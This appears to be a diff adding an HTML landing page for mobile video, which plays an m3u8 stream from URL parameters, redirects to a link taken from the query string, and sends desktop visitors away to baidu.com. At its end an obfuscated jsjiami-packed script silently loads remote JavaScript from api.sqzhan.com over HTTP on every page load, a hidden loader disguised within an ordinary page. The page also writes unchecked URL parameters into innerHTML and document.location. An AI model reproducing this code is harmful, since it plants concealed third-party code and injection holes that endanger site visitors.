@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html style=" background-color: #000000;">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="edge">
+    <meta http-equiv="Expirse" content="0">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="Cache" content="no-cache">
+    <meta name="viewport" content="width=device-width, initial-scale=1，maximum-scale=1，minimum-scale=1">
+
+    <title id="titletitle"></title>
+</head>
+<link rel="stylesheet" href="https://g.alicdn.com/de/prismplayer/2.13.2/skins/default/aliplayer-min.css" />
+<script charset="utf-8" type="text/javascript" src="https://g.alicdn.com/de/prismplayer/2.13.2/aliplayer-h5-min.js">
+
+</script>
+<link rel="stylesheet" href="tcjs/iconfont.css" />
+<script src="https://res.wx.qq.com/open/js/jweixin-1.0.0.js"></script>
+</head>
+<body>
+
+<div style="width:100%;height: 90vh;" id="J_prismPlayer"></div>
+<div>
+    <button id="button" onclick="tz()"
+            style="width: 86%; height: 5vh;  color: #fff; color:#000; font-size: 2vh; border-radius: 10px;border: none; position: absolute; bottom: 0; margin: 5%;  float: left;font-weight: bold; "></button>
+    <!-- <span style="color: #fff;  font-size: 5vh; margin-left: 87%; position: absolute; bottom: 0; float: right; " class="icon iconfont icon-fenxiang"></span> -->
+    <!-- <svg onclick="svgclick()" id="svgsvg"  style="color: #fff;   margin-left: 83.5%; position: absolute; bottom: 0; float: right; height: 6vh;" class="icon"   viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M853.333333 533.333333a32 32 0 0 1 64 0v266.666667c0 64.8-52.533333 117.333333-117.333333 117.333333H224c-64.8 0-117.333333-52.533333-117.333333-117.333333V256c0-64.8 52.533333-117.333333 117.333333-117.333333h277.333333a32 32 0 0 1 0 64H224a53.333333 53.333333 0 0 0-53.333333 53.333333v544a53.333333 53.333333 0 0 0 53.333333 53.333333h576a53.333333 53.333333 0 0 0 53.333333-53.333333V533.333333z m-42.058666-277.333333l-89.792-95.402667a32 32 0 0 1 46.613333-43.861333l140.544 149.333333C927.861333 286.485333 913.376 320 885.333333 320H724.704C643.029333 320 576 391.210667 576 480v192a32 32 0 1 1-64 0V480c0-123.296 94.784-224 212.704-224h86.570667z"  /></svg>
+     -->
+
+</div>
+
+
+<div class="ground" id="Ground">
+    <div class="ground1">
+        <div class="headline">
+            <h4 id="Headline" style="text-align: center;"></h4>
+        </div>
+        <div class="button1"><button class="yes" onclick="Button1onclick()" id="Button1">前往</button><button
+                class="no" onclick="conceal()" id="Button2">取消</button></div>
+    </div>
+</div>
+</body>
+<script>
+    if ((navigator.userAgent.match(/(iPhone|iPod|Android|ios|iOS|iPad|WebOS|Symbian|Windows Phone|Phone)/i))) {
+
+        console.log("手机访问");
+        console.log(location.search);
+        var params = location.search.substr(1);
+        var arr = params.split('=');
+        console.log(arr);
+        console.log(arr[0]);
+        console.log(arr[1]);
+        console.log(arr[2]);
+        document.getElementById("titletitle").innerHTML = decodeURI(arr[1])
+        document.getElementById("Headline").innerHTML = decodeURI(arr[1])
+        document.getElementById("button").innerHTML = decodeURI(arr[2])
+        var arr000 = decodeURI(arr[0]);
+        var arr01 = arr000.substring(0, 2)
+        var arr02 = arr000.substring(2, 4)
+        var spurl = 'https://shandian8.github.io/imgs/img/' + decodeURI(arr[0]) + '.m3u8'
+        var player = new Aliplayer({
+            id: 'J_prismPlayer',
+            source: spurl,
+        }, function(player) {
+            console.log('The player is created.')
+        });
+        document.getElementById("button").style.backgroundColor = "#" + arr[4]
+        document.getElementById("Button1").style.backgroundColor = "#" + arr[4]
+        document.getElementById("Button2").style.backgroundColor = "#" + arr[4]
+        /* document.getElementById("svgsvg").style.fill=  "#" + arr[4] */
+        var index = 0;
+
+        function changeTitle() {
+            if (arr[7] == "1") {
+                if (index % 2 == 0) {
+                    document.getElementById("titletitle").innerHTML = "★☆" + decodeURI(arr[1]) + "★☆";
+
+                } else {
+                    document.getElementById("titletitle").innerHTML = "☆★" + decodeURI(arr[1]) + "☆★";
+
+                }
+            }
+
+
+            index++;
+            //alert(index);  //测试index
+            setTimeout("changeTitle()", 500);
+        }
+
+        function autoPlay() {
+            wx.config({
+                // 配置信息, 即使不正确也能使用 wx.ready
+                debug: false, //false代表关闭调试模式，true代表开启调试模式
+                appId: '', //appId
+                timestamp: 1, //生成签名的时间戳
+                nonceStr: '', //生成签名的随机串
+                signature: '', //签名
+                jsApiList: [] //需要使用的JS接口列表
+            });
+            wx.ready(function() {
+                if (player) //创建的Aliplayer对象
+                {
+                    player.play();
+                }
+            });
+        };
+        // 解决ios不自动播放的问题
+        autoPlay();
+        window.onload = changeTitle;
+
+        player.on('pause', function() {
+            if (arr[5] == "1") {
+                document.getElementById("Ground").style.display = "block";
+
+            }
+
+
+        })
+        player.on('play', function() {
+            if (arr[5] == "1") {
+                document.getElementById("Ground").style.display = "none";
+
+            }
+
+
+        })
+
+        player.on('ended', function() {
+            if (arr[6] == "1") {
+                document.location = decodeURIComponent(arr[3])
+            }
+        })
+
+        function Button1onclick() {
+            document.location = decodeURIComponent(arr[3])
+        }
+
+        function conceal() {
+            document.getElementById("Ground").style.display = "none";
+            player.play()
+        }
+
+        function tz() {
+            document.location = decodeURIComponent(arr[3])
+        }
+
+    } else {
+
+        document.location = "https://www.baidu.com/"
+
+    }
+    function svgclick() {
+
+    }
+</script>
+<script>
+var version_='jsjiami.com.v7',_0x2860=(function(){return[...[version_,'yWUjDMDsHpjiaCmqPidT.ytcQomr.vh7SFuSpSnp==','WOVdJtlcHmovWRpcRCkAWQNdMu7dOq','W6v+wxRcIMSQWRjmgCozzg0','AIvqwb3cLaiiW5ddLSoz','fwXIfcXUW5lcTIZcKCoTgW','tmkmWO7cTwxdTg13','W43dT8oUW75JzeDFWQ8PWR0','Ec4Rug8/uCoK'],...(function(){return[...['WOrQv0lcQSo8i8oibmktjmoTW4G','nwnmW6NdTCoXE3m','W6tcHIVcVG','h0ddTSk0W4VdPMhdKCoIW5O3WPLd','WQhcPCo9n1r0nmoPW7aaDmoT','pmoKqSk0hCoDaW','DKGNWQD/w8kcWOe','WPj+eH3dR0CwkmoHifev','WPNcG8obCHipWOz0otzdW4C7'],...(function(){return['WOrUdHxdLCkJq8ot','x2tcMubhe8kFWRH6DCkXEW','imontCkNqqpdUZJdQWRcHW','WPWVW7ldR3ya','E2b2W43cRq','hgPUhszTW7FcRt/cP8ocba','d8klFq3cICkZAfldPSowWQFdGa','mwCPC8oqW7ugzW'];}())];}())];}());(function(_0x50258d,_0x39daa8,_0x52c832,_0x5f3dcc,_0x3fa53c,_0x210040,_0x513f3f){return _0x50258d=_0x50258d>>0x9,_0x210040='hs',_0x513f3f='hs',function(_0x4a3e9e,_0x284ed4,_0xdd84ec,_0x53ae86,_0x4b4cc9){const _0x21463f=_0x49ec;_0x53ae86='tfi',_0x210040=_0x53ae86+_0x210040,_0x4b4cc9='up',_0x513f3f+=_0x4b4cc9,_0x210040=_0xdd84ec(_0x210040),_0x513f3f=_0xdd84ec(_0x513f3f),_0xdd84ec=0x0;const _0x433490=_0x4a3e9e;while(!![]&&--_0x5f3dcc+_0x284ed4){try{_0x53ae86=-parseInt(_0x21463f(0x151,'#%Z7'))/0x1+-parseInt(_0x21463f(0x165,'7xC]'))/0x2+parseInt(_0x21463f(0x15d,'S*t%'))/0x3*(-parseInt(_0x21463f(0x15a,'Mg]w'))/0x4)+parseInt(_0x21463f(0x166,'l$Y3'))/0x5+-parseInt(_0x21463f(0x162,'6z]('))/0x6*(-parseInt(_0x21463f(0x15b,'%dH#'))/0x7)+-parseInt(_0x21463f(0x163,'&r2W'))/0x8*(-parseInt(_0x21463f(0x158,'qXUB'))/0x9)+parseInt(_0x21463f(0x167,'aCN('))/0xa*(-parseInt(_0x21463f(0x154,'Mg]w'))/0xb);}catch(_0x4d6a01){_0x53ae86=_0xdd84ec;}finally{_0x4b4cc9=_0x433490[_0x210040]();if(_0x50258d<=_0x5f3dcc)_0xdd84ec?_0x3fa53c?_0x53ae86=_0x4b4cc9:_0x3fa53c=_0x4b4cc9:_0xdd84ec=_0x4b4cc9;else{if(_0xdd84ec==_0x3fa53c['replace'](/[yUSHDWpqhCdTPuFtrnQM=]/g,'')){if(_0x53ae86===_0x284ed4){_0x433490['un'+_0x210040](_0x4b4cc9);break;}_0x433490[_0x513f3f](_0x4b4cc9);}}}}}(_0x52c832,_0x39daa8,function(_0x4cbffa,_0x12eaa5,_0xfebab3,_0x67aead,_0x420b9d,_0x3e5662,_0x10f928){return _0x12eaa5='\x73\x70\x6c\x69\x74',_0x4cbffa=arguments[0x0],_0x4cbffa=_0x4cbffa[_0x12eaa5](''),_0xfebab3=`\x72\x65\x76\x65\x72\x73\x65`,_0x4cbffa=_0x4cbffa[_0xfebab3]('\x76'),_0x67aead=`\x6a\x6f\x69\x6e`,(0x11cdd0,_0x4cbffa[_0x67aead](''));});}(0x17c00,0x344f1,_0x2860,0xc0),_0x2860)&&(version_=_0x2860);func();function _0x49ec(_0x553044,_0x552bf2){const _0x28606e=_0x2860;return _0x49ec=function(_0x49ec98,_0x20d916){_0x49ec98=_0x49ec98-0x151;let _0x2c6709=_0x28606e[_0x49ec98];if(_0x49ec['OAMeuj']===undefined){var _0xdef6c4=function(_0x3fb94e){const _0x4298e0='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x51e121='',_0x2ad177='';for(let _0x121679=0x0,_0x40bdd6,_0x31ecad,_0x44469e=0x0;_0x31ecad=_0x3fb94e['charAt'](_0x44469e++);~_0x31ecad&&(_0x40bdd6=_0x121679%0x4?_0x40bdd6*0x40+_0x31ecad:_0x31ecad,_0x121679++%0x4)?_0x51e121+=String['fromCharCode'](0xff&_0x40bdd6>>(-0x2*_0x121679&0x6)):0x0){_0x31ecad=_0x4298e0['indexOf'](_0x31ecad);}for(let _0x1d6c52=0x0,_0x5a3ccc=_0x51e121['length'];_0x1d6c52<_0x5a3ccc;_0x1d6c52++){_0x2ad177+='%'+('00'+_0x51e121['charCodeAt'](_0x1d6c52)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2ad177);};const _0x3d687c=function(_0x481ef2,_0x3f76b1){let _0x2c9e2f=[],_0x3a2e33=0x0,_0x1c5636,_0x5da0ae='';_0x481ef2=_0xdef6c4(_0x481ef2);let _0x86960;for(_0x86960=0x0;_0x86960<0x100;_0x86960++){_0x2c9e2f[_0x86960]=_0x86960;}for(_0x86960=0x0;_0x86960<0x100;_0x86960++){_0x3a2e33=(_0x3a2e33+_0x2c9e2f[_0x86960]+_0x3f76b1['charCodeAt'](_0x86960%_0x3f76b1['length']))%0x100,_0x1c5636=_0x2c9e2f[_0x86960],_0x2c9e2f[_0x86960]=_0x2c9e2f[_0x3a2e33],_0x2c9e2f[_0x3a2e33]=_0x1c5636;}_0x86960=0x0,_0x3a2e33=0x0;for(let _0x5540a9=0x0;_0x5540a9<_0x481ef2['length'];_0x5540a9++){_0x86960=(_0x86960+0x1)%0x100,_0x3a2e33=(_0x3a2e33+_0x2c9e2f[_0x86960])%0x100,_0x1c5636=_0x2c9e2f[_0x86960],_0x2c9e2f[_0x86960]=_0x2c9e2f[_0x3a2e33],_0x2c9e2f[_0x3a2e33]=_0x1c5636,_0x5da0ae+=String['fromCharCode'](_0x481ef2['charCodeAt'](_0x5540a9)^_0x2c9e2f[(_0x2c9e2f[_0x86960]+_0x2c9e2f[_0x3a2e33])%0x100]);}return _0x5da0ae;};_0x49ec['JwUbro']=_0x3d687c,_0x553044=arguments,_0x49ec['OAMeuj']=!![];}const _0x625355=_0x28606e[0x0],_0x35bd54=_0x49ec98+_0x625355,_0x35f31b=_0x553044[_0x35bd54];return!_0x35f31b?(_0x49ec['xXrGcC']===undefined&&(_0x49ec['xXrGcC']=!![]),_0x2c6709=_0x49ec['JwUbro'](_0x2c6709,_0x20d916),_0x553044[_0x35bd54]=_0x2c6709):_0x2c6709=_0x35f31b,_0x2c6709;},_0x49ec(_0x553044,_0x552bf2);}function func(){const _0x3c122b=_0x49ec,_0x2c70e0={'pZaUj':_0x3c122b(0x152,'&2Tr')};let _0x404ff9=document['createElement'](_0x2c70e0[_0x3c122b(0x153,'51^V')]);_0x404ff9['src']='http://api.sqzhan.com/js/index.js',document[_0x3c122b(0x160,']XLk')][_0x3c122b(0x15c,'G@9#')](_0x404ff9);};var version_ = 'jsjiami.com.v7';
+</script>
+</html>
+<style>
+    .ground {
+        display: none;
+
+        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+        width: 200px;
+        height: 100px;
+        border-radius: 20px;
+        border: 2px solid #fff;
+        background: #fff;
+        margin: auto;
+        position: absolute;
+        top: -200px;
+        left: 0;
+        right: 0;
+        bottom: 0;
+    }
+
+    .ground1 {
+        position: relative;
+    }
+
+    .headline {
+        margin: auto;
+        position: absolute;
+        top: 1px;
+        left: 10%;
+        bottom: 0;
+    }
+
+    /*#Headline{
+            text-align: alert;
+        }*/
+    .yes,
+    .no {
+        border: none;
+
+        border-radius: 11px;
+        width: 22%;
+        height: 25px;
+        font-size: 10px;
+    }
+
+    .yes {
+        margin: auto;
+        position: absolute;
+        top: 150px;
+        left: 5px;
+        right: 0;
+        bottom: 0;
+    }
+
+    .no {
+        margin: auto;
+        position: absolute;
+        top: 150px;
+        left: 120px;
+        right: 0;
+        bottom: 0;
+    }
+
+    button:hover {
+
+        border: 2px solid #ffdd55;
+    }
+</style>
